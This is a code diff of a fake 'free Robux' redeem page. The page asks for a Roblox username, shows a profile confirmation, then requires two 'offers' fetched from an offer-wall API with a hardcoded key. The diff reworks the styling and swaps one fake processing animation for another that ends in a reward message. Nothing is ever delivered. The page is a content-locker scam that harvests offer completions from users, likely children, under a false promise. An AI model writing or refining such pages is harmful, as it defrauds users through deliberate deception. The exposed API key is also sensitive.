@@ -5,12 +5,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>hzm Redeem</title>
 <style>
-body { font-family: Arial, Helvetica, sans-serif; background: radial-gradient(circle at top,#0b1c3d,#050b1f 70%); color:white; display:flex; flex-direction:column; align-items:center; padding-top:50px;}
-.container { width:350px; display:flex; flex-direction:column; gap:15px;}
-.logo { font-size:40px; font-weight:bold; text-align:center; margin-bottom:10px;}
-input.locked { pointer-events:none; user-select:none; border:1px solid white; border-radius:6px; padding:14px; color:white; background:transparent; text-align:center;}
-input[type=text]{padding:14px;border-radius:6px;border:1px solid #555;background:transparent;color:white;}
-button{padding:14px;border-radius:6px;border:none;background:linear-gradient(90deg,#008cff,#00c6ff);color:white;font-weight:bold;cursor:pointer;}
+html,body { margin:0; padding:0; height:100%; width:100%; font-family:Arial, Helvetica, sans-serif; background: radial-gradient(circle at top,#0b1c3d,#050b1f 70%); color:white; display:flex; justify-content:center; align-items:center; }
+#step1 { display:flex; flex-direction:column; gap:15px; align-items:center; text-align:center; background:rgba(15,31,69,0.8); padding:40px; border-radius:16px; box-shadow:0 0 25px rgba(0,140,255,0.3); }
+.logo { font-size:40px; font-weight:bold; margin-bottom:10px; }
+input.locked { pointer-events:none; user-select:none; border:1px solid white; border-radius:6px; padding:14px; color:white; background:transparent; text-align:center; width:250px;}
+input[type=text]{padding:14px;border-radius:6px;border:1px solid #555;background:transparent;color:white;width:250px;}
+button{padding:14px;border-radius:6px;border:none;background:linear-gradient(90deg,#008cff,#00c6ff);color:white;font-weight:bold;cursor:pointer;width:260px;}
 button:hover{transform:translateY(-2px);}
 .error{color:#ff4d6d;text-align:center;height:18px;font-size:14px;}
 .modal { position: fixed; inset:0; display:flex; justify-content:center; align-items:center; background: rgba(0,0,0,0.6); display:none;}
@@ -25,15 +25,15 @@ button:hover{transform:translateY(-2px);}
 .progress-container { background:#1c2d5c; border-radius:10px; height:20px; width:100%; overflow:hidden; margin-bottom:10px;}
 .progress-bar { height:100%; width:0%; background: linear-gradient(90deg,#008cff,#00c6ff); transition: width 0.5s; }
 .reward-text { margin-top:10px; font-weight:bold; color:#00ff6a; display:none; text-align:center; }
-.offer { background:linear-gradient(90deg,#008cff,#00c6ff); padding:12px; margin-bottom:10px; border-radius:10px; cursor:pointer; font-weight:600; }
+.offer { background:linear-gradient(90deg,#008cff,#00c6ff); padding:12px; margin-bottom:10px; border-radius:10px; cursor:pointer; font-weight:600; position:relative; }
 .offer.done { opacity:0.6; text-decoration:line-through; }
-.offer:hover { background:linear-gradient(90deg,#00c6ff,#008cff); }
+.processing-overlay { position:absolute; inset:0; background:rgba(255,255,255,0.3); display:flex; justify-content:center; align-items:center; font-weight:bold; color:#000; font-size:16px; border-radius:10px; display:none; }
 </style>
 </head>
 <body>
 
-<!-- STEP 1: Username Input -->
-<div class="container" id="step1">
+<!-- Step 1 -->
+<div id="step1">
   <div class="logo">hzm</div>
   <input type="text" value="2,000 Robux" class="locked" readonly>
   <input type="text" id="usernameInput" placeholder="Enter Roblox Username">
@@ -41,7 +41,7 @@ button:hover{transform:translateY(-2px);}
   <div class="error" id="errorMsg"></div>
 </div>
 
-<!-- STEP 2: Profile Modal -->
+<!-- Step 2: Profile Modal -->
 <div class="modal" id="profileModal">
   <div class="card">
     <h3>✔ Confirm Your Profile</h3>
@@ -56,7 +56,7 @@ button:hover{transform:translateY(-2px);}
   </div>
 </div>
 
-<!-- STEP 3: Quest/Offers Box -->
+<!-- Step 3: Quest / Offers -->
 <div class="quest-box" id="questBox">
   <h3>Complete 2 offers below to claim 2,000 Robux</h3>
   <div id="offersContainer"></div>
@@ -66,27 +66,27 @@ button:hover{transform:translateY(-2px);}
 </div>
 
 <script>
-const step1 = document.getElementById("step1");
-const redeemBtn = document.getElementById("redeemBtn");
-const usernameInput = document.getElementById("usernameInput");
-const errorMsg = document.getElementById("errorMsg");
+const step1=document.getElementById("step1");
+const redeemBtn=document.getElementById("redeemBtn");
+const usernameInput=document.getElementById("usernameInput");
+const errorMsg=document.getElementById("errorMsg");
 
-const profileModal = document.getElementById("profileModal");
-const displayName = document.getElementById("displayName");
-const handle = document.getElementById("handle");
-const avatar = document.getElementById("avatar");
-const noBtn = document.getElementById("noBtn");
-const yesBtn = document.getElementById("yesBtn");
+const profileModal=document.getElementById("profileModal");
+const displayName=document.getElementById("displayName");
+const handle=document.getElementById("handle");
+const avatar=document.getElementById("avatar");
+const noBtn=document.getElementById("noBtn");
+const yesBtn=document.getElementById("yesBtn");
 
-const questBox = document.getElementById("questBox");
-const offersContainer = document.getElementById("offersContainer");
-const doneCountEl = document.getElementById("doneCount");
-const progressBar = document.getElementById("progressBar");
-const rewardText = document.getElementById("rewardText");
+const questBox=document.getElementById("questBox");
+const offersContainer=document.getElementById("offersContainer");
+const doneCountEl=document.getElementById("doneCount");
+const progressBar=document.getElementById("progressBar");
+const rewardText=document.getElementById("rewardText");
 
-let doneCount = 0;
+let doneCount=0;
 
-// STEP 1: Redeem click
+// Step 1: Redeem
 redeemBtn.addEventListener("click",()=>{
   const username=usernameInput.value.trim();
   errorMsg.textContent="";
@@ -97,11 +97,8 @@ redeemBtn.addEventListener("click",()=>{
   profileModal.style.display="flex";
 });
 
-// STEP 2: Modal buttons
-noBtn.addEventListener("click",()=>{
-  profileModal.style.display="none";
-});
-
+// Step 2: Modal
+noBtn.addEventListener("click",()=>{ profileModal.style.display="none"; });
 yesBtn.addEventListener("click",()=>{
   profileModal.style.display="none";
   step1.style.display="none";
@@ -109,7 +106,7 @@ yesBtn.addEventListener("click",()=>{
   fetchOffers();
 });
 
-// STEP 3: Fetch offers as quests
+// Step 3: Fetch offers
 function fetchOffers(){
   const username=usernameInput.value.trim();
   const apiKey="4ae12a8fe006e35d228f7d24ff8d2729";
@@ -120,7 +117,6 @@ function fetchOffers(){
   fetch(apiUrl)
   .then(res=>res.json())
   .then(data=>{
-    console.log("Offers:",data);
     let offersArray=[];
     if(Array.isArray(data)) offersArray=data;
     else if(data.offers) offersArray=data.offers;
@@ -137,17 +133,25 @@ function fetchOffers(){
       const el=document.createElement("div");
       el.className="offer";
       el.textContent=offer.name || `Offer ${index+1}`;
+      const overlay=document.createElement("div");
+      overlay.className="processing-overlay";
+      overlay.textContent="Processing...";
+      el.appendChild(overlay);
+
       el.addEventListener("click",()=>{
-        if(!el.classList.contains("done")){
-          el.classList.add("done");
-          doneCount++;
-          doneCountEl.textContent=doneCount;
-          startFakeProcessing();
+        if(!el.classList.contains("done") && overlay.style.display==="none"){
+          overlay.style.display="flex";
+          fakeProcessing(overlay,()=>{ // After fake processing
+            el.classList.add("done");
+            overlay.style.display="none";
+            doneCount++;
+            doneCountEl.textContent=doneCount;
+            updateProgress();
+            if(doneCount>=2){
+              rewardText.style.display="block";
+            }
+          });
           window.open(offer.url,"_blank");
-          if(doneCount>=2){
-            rewardText.style.display="block";
-            progressBar.style.width="100%";
-          }
         }
       });
       offersContainer.appendChild(el);
@@ -159,24 +163,20 @@ function fetchOffers(){
   });
 }
 
-// Fake progress bar animation
-function startFakeProcessing(){
-  let width=parseInt(progressBar.style.width) || 0;
-  const interval1=setInterval(()=>{
-    width+=1;
-    if(width>=20) clearInterval(interval1);
+// Fake processing overlay animation
+function fakeProcessing(overlay,callback){
+  let width=0;
+  const interval=setInterval(()=>{
+    width+=Math.floor(Math.random()*5+2); // random speed
+    if(width>=100){ width=100; clearInterval(interval); callback(); }
     progressBar.style.width=width+"%";
-  },3000);
-  setTimeout(()=>{
-    let width2=parseInt(progressBar.style.width)||20;
-    const interval2=setInterval(()=>{
-      width2+=1;
-      if(width2>=60) clearInterval(interval2);
-      progressBar.style.width=width2+"%";
-    },5000);
-  },2000);
+  },500);
+}
+
+function updateProgress(){
+  let pct = Math.min(100, (doneCount/2)*100 );
+  progressBar.style.width=pct+"%";
 }
 </script>
-
 </body>
 </html>
